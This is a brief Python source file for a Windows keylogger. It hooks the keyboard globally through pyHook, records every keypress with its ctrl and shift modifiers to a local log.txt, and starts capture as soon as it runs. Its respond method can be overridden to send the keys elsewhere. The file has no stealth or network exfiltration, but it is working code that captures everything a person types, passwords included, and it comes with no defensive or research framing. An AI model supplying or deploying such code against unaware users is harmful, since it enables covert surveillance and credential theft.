from pyHook import HookManager, GetKeyState, HookConstants
from pythoncom import PumpMessages
from sys import stdout
from logging import getLogger, FileHandler, Formatter, DEBUG
import string

import pdb

# TODO supress RuntimeWarning. figure out alt error.

class KeyLogger(object):

    def __init__(self, logging=True):
        if logging:
            log_file = "log.txt"
            self.logger = getLogger("keys")
            handler = FileHandler(log_file)
            formatter = Formatter("%(message)s")
            handler.setFormatter(formatter)
            self.logger.addHandler(handler)
            self.logger.setLevel(DEBUG)

    def ctrl_down(self):
        """ Determine if either control key is pressed

        """
        return GetKeyState(HookConstants.VKeyToID("VK_CONTROL"))

    def shift_down(self):
        """ Determine if either shift key is pressed

        """
        return GetKeyState(HookConstants.VKeyToID("VK_SHIFT"))

    def key_log(self, event):
        """ Properly record key presses

        """
        key=event.GetKey()
        ctrl = self.ctrl_down()
        shift = self.shift_down()
        if ctrl and shift:
            final_key = "ctrl+shift+"+key
        elif ctrl:
            if key in string.ascii_uppercase:
                final_key = "ctrl+"+key.lower()
            else:
                final_key = "ctrl+"+key
        elif shift:
            final_key = "shift+"+key
        else:
            if key in string.ascii_uppercase:
                final_key = key.lower()
            else:
                final_key = key
        self.respond(final_key)

    def respond(self, key):
        """ Override this function to change key response functionality.

        Default functionality logs keys to file.
        """
        self.logger.info(str(key))

    def start_capture(self):
        """ Hook keyboard and pull key presses

        """
        hook = HookManager()
        hook.KeyDown = self.key_log
        hook.HookKeyboard()
        PumpMessages()


if __name__ == "__main__":
    kl = KeyLogger()
    kl.start_capture()
